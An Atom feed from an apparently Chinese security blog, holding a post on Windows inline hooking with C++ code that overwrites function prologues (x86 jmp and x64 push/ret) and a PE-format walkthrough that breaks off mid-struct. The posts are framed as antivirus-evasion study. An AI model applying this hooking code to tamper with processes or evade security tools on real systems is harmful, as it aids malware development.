<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Joe1sn&#39;s Cabinet</title>
  
  
  <link href="https://joe1sn.eu.org/atom.xml" rel="self"/>
  
  <link href="https://joe1sn.eu.org/"/>
  <updated>2024-03-15T06:09:23.308Z</updated>
  <id>https://joe1sn.eu.org/</id>
  
  <author>
    <name>Joe1sn</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>【免杀】Windows Inline Hook小结</title>
    <link href="https://joe1sn.eu.org/2024/03/15/little-hook/"/>
    <id>https://joe1sn.eu.org/2024/03/15/little-hook/</id>
    <published>2024-03-15T05:47:31.000Z</published>
    <updated>2024-03-15T06:09:23.308Z</updated>
    
    <content type="html"><![CDATA[<p>Inline Hook还是挺好玩的</p><p>文章很短，只是打个总结，记录一些有趣的发现</p><span id="more"></span><h1 id="写在前面"><a class="markdownIt-Anchor" href="#写在前面"></a> 写在前面</h1><p>之前在学习hook的时候，发现抄的一段代码只能在Debug模式下运行，调试后发现MSVC很有趣的一个点</p><p>当我们使用Debug模式编译的时候，程序为了调试方便，会将所有函数加入这个表中</p><p>比如</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">oldtest</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;not hook&quot;</span>, <span class="string">&quot;test&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">oldtest</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>按照直觉<img src="https://img.joe1sn.top/uploads/big/45f2ae66613617bdfe44a54f286f7ab5.png" alt="image-20240315135117012" /></p><p>这里的<code>call</code>应该会直接来到函数的位置，但是真实情况并非如此</p><p><img src="https://img.joe1sn.top/uploads/big/f9b93b22f4d696e77ab104663a1504dd.png" alt="image-20240315135138849" /></p><p>我们会发现一张跳表，根据距离这张表的地址差进行跳转，那段hook只是修改了这一段代码</p><h1 id="x86-hook"><a class="markdownIt-Anchor" href="#x86-hook"></a> x86 hook</h1><p>首先是<code>x86</code>为啥叫32位架构，最突出的就是一个寄存器有32位(bit)大小，那么计算一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(1&lt;&lt;32)/int(1024*1024*1024) = 4</span><br></pre></td></tr></table></figure><p>没错，32位的寄存器最多只能存放4GB个数字（比如从<code>1</code>到<code>0x100000000</code>），<br />由于要做加减发（有负数），所以能找到的地址位<code>±2GB</code>，<br />那么8位为一个字节，那么一个寄存器只能由4个字节，<br /><code>jmp</code>根据4字节这样对齐，所以32位下我们只需要<strong>覆盖5字节</strong>就能实现任意地址的跳转，<br />再加上之前的debug模式，可以写出下列hook代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Hooks::InlineHook_x32</span><span class="params">(FuncAddr HookFunction)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//set read write</span></span><br><span class="line">    DWORD old;</span><br><span class="line">    DWORD size = <span class="number">5</span>;</span><br><span class="line">    FuncAddr offset = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">VirtualProtect</span>(<span class="built_in">LPVOID</span>(<span class="keyword">this</span>-&gt;FunctionAddr), size, PAGE_EXECUTE_READWRITE, &amp;old)) &#123;</span><br><span class="line">        <span class="built_in">Error</span>(<span class="string">&quot;Can&#x27;t Set Memory read/write&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _DEBUG</span></span><br><span class="line">    <span class="comment">//hook with debug jmp table</span></span><br><span class="line">    offset = HookFunction - <span class="keyword">this</span>-&gt;FunctionAddr - <span class="number">5</span>;</span><br><span class="line">    *(<span class="type">char</span>*)<span class="keyword">this</span>-&gt;FunctionAddr = <span class="string">&#x27;\xE9&#x27;</span>;</span><br><span class="line">    *(DWORD*)(<span class="keyword">this</span>-&gt;FunctionAddr + <span class="number">1</span>) = offset;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//return to the origin</span></span><br><span class="line">    size = <span class="number">5</span>;</span><br><span class="line">    FuncAddr RealAddr = <span class="keyword">this</span>-&gt;<span class="built_in">GetRealAddr</span>((<span class="type">void</span> *)HookFunction);</span><br><span class="line">    FuncAddr func_size = <span class="keyword">this</span>-&gt;<span class="built_in">GetProcSize</span>(RealAddr) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">VirtualProtect</span>(<span class="built_in">LPVOID</span>(RealAddr + func_size), size, PAGE_EXECUTE_READWRITE, &amp;old)) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">Error</span>(<span class="string">&quot;Can&#x27;t Set Memory read/write&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *(<span class="type">char</span>*)(RealAddr + func_size + <span class="number">0</span>) = <span class="string">&#x27;\xE9&#x27;</span>;</span><br><span class="line">    offset = <span class="keyword">this</span>-&gt;RealAddr - RealAddr;</span><br><span class="line">    *(DWORD*)(RealAddr + func_size + <span class="number">1</span>) = (offset - func_size - <span class="number">5</span>);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="comment">//get first 5 bytes</span></span><br><span class="line">    <span class="type">char</span> head[<span class="number">6</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">memcpy</span>(head, (<span class="type">void</span>*)<span class="keyword">this</span>-&gt;FunctionAddr, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (HookFunction &gt; <span class="keyword">this</span>-&gt;FunctionAddr)</span><br><span class="line">        offset = (HookFunction - <span class="keyword">this</span>-&gt;FunctionAddr - <span class="number">5</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        offset = ~(<span class="keyword">this</span>-&gt;FunctionAddr - HookFunction - <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="type">char</span>*)(<span class="keyword">this</span>-&gt;FunctionAddr + <span class="number">0</span>) = <span class="string">&#x27;\xE9&#x27;</span>;</span><br><span class="line">    *(DWORD*)(<span class="keyword">this</span>-&gt;FunctionAddr + <span class="number">1</span>) = offset - <span class="number">9</span>; <span class="comment">//API hook</span></span><br><span class="line">    <span class="comment">//*(DWORD*)(this-&gt;FunctionAddr + 1) = offset;   //</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//return to the origin</span></span><br><span class="line">    FuncAddr func_size = <span class="keyword">this</span>-&gt;<span class="built_in">GetProcSize</span>(HookFunction) - <span class="number">1</span>;</span><br><span class="line">    size = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">VirtualProtect</span>(<span class="built_in">LPVOID</span>(HookFunction + func_size), size, PAGE_EXECUTE_READWRITE, &amp;old)) &#123;</span><br><span class="line">        <span class="built_in">Error</span>(<span class="string">&quot;Can&#x27;t Set Memory read/write&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//reset the top 5bytes in header</span></span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="type">void</span>*)((FuncAddr)HookFunction + func_size), head, <span class="number">5</span>);</span><br><span class="line">    *(<span class="type">char</span>*)(HookFunction + func_size + <span class="number">5</span>) = <span class="string">&#x27;\xE9&#x27;</span>;</span><br><span class="line">    <span class="comment">//*(DWORD*)(HookFunction + func_size + 6) = ~(offset + func_size + 9);</span></span><br><span class="line">    *(DWORD*)(HookFunction + func_size + <span class="number">6</span>) = ~(offset + func_size);    <span class="comment">//win api hook</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="x64-hook"><a class="markdownIt-Anchor" href="#x64-hook"></a> x64 hook</h1><p>上面讲到了x86 hook只能2GB内内存寻址，到了x64寻址空间大大加大，单纯<code>jmp</code>和<code>call</code>已经无法跳转到地址，后来我看到一个很有意思的方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[Bits 64]</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    push addr.low</span><br><span class="line">    mov dword [rsp+4], addr.high</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure><p>这个方法不会污染寄存器，也不会对栈造成影响，所以得到hook函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">Hook::EnHook</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>-&gt;OldFuncOpcode != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;[!]Already Hooked\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    DWORD old;</span><br><span class="line">    <span class="built_in">VirtualProtect</span>((LPVOID)<span class="keyword">this</span>-&gt;OldFunc, <span class="keyword">this</span>-&gt;OpSzie, PAGE_EXECUTE_READWRITE, &amp;old);</span><br><span class="line">    <span class="keyword">this</span>-&gt;OldFuncOpcode = (PBYTE)<span class="built_in">malloc</span>(<span class="keyword">this</span>-&gt;OpSzie + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>-&gt;OldFuncOpcode == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;[!] Hook Function Malloc Failed\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(<span class="keyword">this</span>-&gt;OldFuncOpcode, (<span class="type">void</span>*)<span class="keyword">this</span>-&gt;OldFunc, <span class="keyword">this</span>-&gt;OpSzie);</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;[*] Capture The First &quot;</span> &lt;&lt; <span class="keyword">this</span>-&gt;OpSzie &lt;&lt; <span class="string">&quot; Bytes: &quot;</span>;</span><br><span class="line">    <span class="function">std::vector&lt;BYTE&gt; <span class="title">vec</span><span class="params">(<span class="keyword">this</span>-&gt;OldFuncOpcode, <span class="keyword">this</span>-&gt;OldFuncOpcode + <span class="keyword">this</span>-&gt;OpSzie)</span></span>;</span><br><span class="line">    std::cout &lt;&lt; std::hex;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> num : vec)</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;0x&quot;</span> &lt;&lt; num &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    std::cout &lt;&lt; std::dec &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;[*] Now Start Hook\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    *     push 0x10000</span></span><br><span class="line"><span class="comment">    *     mov dword [rsp+4], 0x20000</span></span><br><span class="line"><span class="comment">    *     ret</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> jmpopcode[<span class="number">14</span>] = &#123;</span><br><span class="line">        <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC7</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,<span class="number">0x00</span>, <span class="number">0xC3</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//over write to jmp</span></span><br><span class="line">    FuncAddr gap = <span class="keyword">this</span>-&gt;NewFunc;</span><br><span class="line">    *(DWORD32*)(jmpopcode + <span class="number">1</span>) = (DWORD32)gap;</span><br><span class="line">    *(DWORD32*)(jmpopcode + <span class="number">9</span>) = (DWORD32)(gap &gt;&gt; <span class="number">32</span>);</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;[*] Jmp Code Set\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">VirtualProtect</span>((LPVOID)<span class="keyword">this</span>-&gt;OldFunc, <span class="keyword">this</span>-&gt;OpSzie, PAGE_EXECUTE_READWRITE, &amp;old);</span><br><span class="line">    <span class="built_in">memcpy</span>((PVOID)<span class="keyword">this</span>-&gt;OldFunc, jmpopcode, <span class="keyword">this</span>-&gt;OpSzie);</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;[*] Opcode Set\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>保存好覆盖的字节，后续接触hook的时候再覆盖回来</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Inline Hook还是挺好玩的&lt;/p&gt;
&lt;p&gt;文章很短，只是打个总结，记录一些有趣的发现&lt;/p&gt;</summary>
    
    
    
    <category term="program" scheme="https://joe1sn.eu.org/categories/program/"/>
    
    
    <category term="malware" scheme="https://joe1sn.eu.org/tags/malware/"/>
    
    <category term="C" scheme="https://joe1sn.eu.org/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>【免杀】PE文件分析</title>
    <link href="https://joe1sn.eu.org/2024/02/25/PeFile/"/>
    <id>https://joe1sn.eu.org/2024/02/25/PeFile/</id>
    <published>2024-02-25T15:17:26.000Z</published>
    <updated>2024-02-25T15:24:44.794Z</updated>
    
    <content type="html"><![CDATA[<p>最近代码能力飞速提升，顺便复习一下</p><span id="more"></span><p>一般就是</p><ul><li>DOS头：<code>IMAGE_DOS_HEADER</code>结构体</li><li>PE头：<code>IMAGE_NT_HEADERS</code>结构体</li><li>Section头：<code>IMAGE_SECTION_HEADER</code>结构体</li></ul><p>OK，如果要分析PE文件的话，首先把文件读取出来</p><p>那么如何解析呢？这就是C/C++非常方便的一点：直接使用结构体转换，例如把地址值解析为数值<br />总体就是解释内存中的值</p><h1 id="dos-头"><a class="markdownIt-Anchor" href="#dos-头"></a> DOS 头</h1><p>先看DOSHeader吧</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_DOS_HEADER</span> &#123;      <span class="comment">// DOS .EXE header</span></span><br><span class="line">    WORD   e_magic;                     <span class="comment">// Magic number</span></span><br><span class="line">    WORD   e_cblp;                      <span class="comment">// Bytes on last page of file</span></span><br><span class="line">    WORD   e_cp;                        <span class="comment">// Pages in file</span></span><br><span class="line">    WORD   e_crlc;                      <span class="comment">// Relocations</span></span><br><span class="line">    WORD   e_cparhdr;                   <span class="comment">// Size of header in paragraphs</span></span><br><span class="line">    WORD   e_minalloc;                  <span class="comment">// Minimum extra paragraphs needed</span></span><br><span class="line">    WORD   e_maxalloc;                  <span class="comment">// Maximum extra paragraphs needed</span></span><br><span class="line">    WORD   e_ss;                        <span class="comment">// Initial (relative) SS value</span></span><br><span class="line">    WORD   e_sp;                        <span class="comment">// Initial SP value</span></span><br><span class="line">    WORD   e_csum;                      <span class="comment">// Checksum</span></span><br><span class="line">    WORD   e_ip;                        <span class="comment">// Initial IP value</span></span><br><span class="line">    WORD   e_cs;                        <span class="comment">// Initial (relative) CS value</span></span><br><span class="line">    WORD   e_lfarlc;                    <span class="comment">// File address of relocation table</span></span><br><span class="line">    WORD   e_ovno;                      <span class="comment">// Overlay number</span></span><br><span class="line">    WORD   e_res[<span class="number">4</span>];                    <span class="comment">// Reserved words</span></span><br><span class="line">    WORD   e_oemid;                     <span class="comment">// OEM identifier (for e_oeminfo)</span></span><br><span class="line">    WORD   e_oeminfo;                   <span class="comment">// OEM information; e_oemid specific</span></span><br><span class="line">    WORD   e_res2[<span class="number">10</span>];                  <span class="comment">// Reserved words</span></span><br><span class="line">    LONG   e_lfanew;                    <span class="comment">// File address of new exe header</span></span><br><span class="line">  &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</span><br></pre></td></tr></table></figure><p>需要的是<code>e_lfanew</code></p><h1 id="nt头"><a class="markdownIt-Anchor" href="#nt头"></a> NT头</h1><p><strong>文件起始地址+e_lfanew = NT头位置</strong></p><p>得到NT头位置后</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_NT_HEADERS64</span> &#123;</span><br><span class="line">    DWORD Signature;</span><br><span class="line">    IMAGE_FILE_HEADER FileHeader;</span><br><span class="line">    IMAGE_OPTIONAL_HEADER64 OptionalHeader;</span><br><span class="line">&#125; IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;</span><br></pre></td></tr></table></figure><p>重要的是<code>IMAGE_OPTIONAL_HEADER</code>，其实都一样，可以从<code>FileHeader</code>得到32位还是64位，</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_FILE_HEADER</span> &#123;</span><br><span class="line">    WORD    Machine;</span><br><span class="line">    WORD    NumberOfSections;</span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    DWORD   PointerToSymbolTable;</span><br><span class="line">    DWORD   NumberOfSymbols;</span><br><span class="line">    WORD    SizeOfOptionalHeader;</span><br><span class="line">    WORD    Characteristics;</span><br><span class="line">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure><ul><li>0x8664：adm64位</li><li>0x014C：intel32位</li></ul><p>接下来以64位举例子</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_OPTIONAL_HEADER64</span> &#123;</span><br><span class="line">    WORD        Magic;</span><br><span class="line">    BYTE        MajorLinkerVersion;</span><br><span class="line">    BYTE        MinorLinkerVersion;</span><br><span class="line">    DWORD       SizeOfCode;</span><br><span class="line">    DWORD       SizeOfInitializedData;</span><br><span class="line">    DWORD       SizeOfUninitializedData;</span><br><span class="line">    DWORD       AddressOfEntryPoint;</span><br><span class="line">    DWORD       BaseOfCode;</span><br><span class="line">    ULONGLONG   ImageBase;</span><br><span class="line">    DWORD       SectionAlignment;</span><br><span class="line">    DWORD       FileAlignment;</span><br><span class="line">    WORD        MajorOperatingSystemVersion;</span><br><span class="line">    WORD        MinorOperatingSystemVersion;</span><br><span class="line">    WORD        MajorImageVersion;</span><br><span class="line">    WORD        MinorImageVersion;</span><br><span class="line">    WORD        MajorSubsystemVersion;</span><br><span class="line">    WORD        MinorSubsystemVersion;</span><br><span class="line">    DWORD       Win32VersionValue;</span><br><span class="line">    DWORD       SizeOfImage;</span><br><span class="line">    DWORD       SizeOfHeaders;</span><br><span class="line">    DWORD       CheckSum;</span><br><span class="line">    WORD        Subsystem;</span><br><span class="line">    WORD        DllCharacteristics;</span><br><span class="line">    ULONGLONG   SizeOfStackReserve;</span><br><span class="line">    ULONGLONG   SizeOfStackCommit;</span><br><span class="line">    ULONGLONG   SizeOfHeapReserve;</span><br><span class="line">    ULONGLONG   SizeOfHeapCommit;</span><br><span class="line">    DWORD       LoaderFlags;</span><br><span class="line">    DWORD       NumberOfRvaAndSizes;</span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64;</span><br></pre></td></tr></table></figure><p>到这里我写了部分代码，结合IDA就很好理解了</p><p><img src="https://img.joe1sn.top/uploads/big/552a423436db68a5ea7e49711a57cb44.png" alt="image-20240225161644926" /></p><p>如果还要继续看的话就是<code>DataDirectory</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_DATA_DIRECTORY</span> &#123;</span><br><span class="line">    DWORD   VirtualAddress;</span><br><span class="line">    DWORD   Size;</span><br><span class="line">&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;</span><br></pre></td></tr></table></figure><p>打印虚拟地址</p><p><img src="https://img.joe1sn.top/uploads/big/0907bace88fffe9b2e7c5ed8eb1cd797.png" alt="img" /></p><p>其实就是导入导出表之类的东西</p><p><img src="https://img.joe1sn.top/uploads/big/7d2269db3ad4229508b16f42af1ed2dc.png" alt="image-20240225163401598" /></p><p>Nt-&gt;ImageBase+这里的偏移，就是运行时的位置</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Directory Entries</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_EXPORT          0   <span class="comment">// Export Directory</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_IMPORT          1   <span class="comment">// Import Directory</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_RESOURCE        2   <span class="comment">// Resource Directory</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_EXCEPTION       3   <span class="comment">// Exception Directory</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_SECURITY        4   <span class="comment">// Security Directory</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_BASERELOC       5   <span class="comment">// Base Relocation Table</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_DEBUG           6   <span class="comment">// Debug Directory</span></span></span><br><span class="line"><span class="comment">//      IMAGE_DIRECTORY_ENTRY_COPYRIGHT       7   // (X86 usage)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_ARCHITECTURE    7   <span class="comment">// Architecture Specific Data</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_GLOBALPTR       8   <span class="comment">// RVA of GP</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_TLS             9   <span class="comment">// TLS Directory</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG    10   <span class="comment">// Load Configuration Directory</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT   11   <span class="comment">// Bound Import Directory in headers</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_IAT            12   <span class="comment">// Import Address Table</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT   13   <span class="comment">// Delay Load Import Descriptors</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR 14   <span class="comment">// COM Runtime descriptor</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="节表相关"><a class="markdownIt-Anchor" href="#节表相关"></a> 节表相关</h1><p>再回到NT头中的<code>FileHeader</code>，提取得到节数量</p><p>DOS头和NT头的大小加起来后面就是第一个Section</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_SECTION_HEADER</span> &#123;</span><br><span class="line">    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">            DWORD   PhysicalAddress;</span><br><span class="line">            DWORD   VirtualSize;</span><br><span class="line">    &#125; Misc;</span><br><span 